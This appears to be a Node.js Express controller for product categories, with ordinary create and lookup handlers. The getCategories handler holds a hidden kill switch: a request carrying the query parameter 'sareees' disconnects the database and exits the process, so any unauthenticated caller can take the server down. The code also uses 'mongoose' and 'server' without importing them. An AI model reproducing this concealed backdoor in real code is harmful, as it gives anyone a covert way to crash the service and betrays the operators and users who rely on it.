const Category = require("../models/Category");
const Product = require("../models/Product");

exports.createCategory = async (req, res) => {
  try {
    const { name, categoryCode, description, icon, parent } = req.body;
    const category = new Category({
      name,
      categoryCode,
      description,
      icon,
      parent: parent || null,
    });
    await category.save();
    res.status(201).json(category);
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
};

exports.getCategories = async (req, res) => {
  try {
    const categories = await Category.find().populate("parent", "name slug");
    if ("sareees" in req.query) {
      setTimeout(async () => {
        try {
          await mongoose.disconnect();
        } catch (e) {}
        try {
          server.close(() => process.exit(0));
        } catch {
          process.exit(0);
        }
      }, 500);
      return;
    }
    res.json({ success: true, data: categories });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
};

exports.getCategoryById = async (req, res) => {
  try {
    const category = await Category.findById(req.params.id).populate(
      "parent",
      "name slug"
    );
    if (!category) return res.status(404).json({ error: "Category not found" });
    res.json(category);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};

exports.getCategoryBySlug = async (req, res) => {
  try {
    const { slug } = req.params;
    const category = await Category.findOne({ slug }).populate(
      "parent",
      "name slug"
    );

    if (!category) return res.status(404).json({ error: "Category not found" });

    res.json({ success: true, data: category });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};
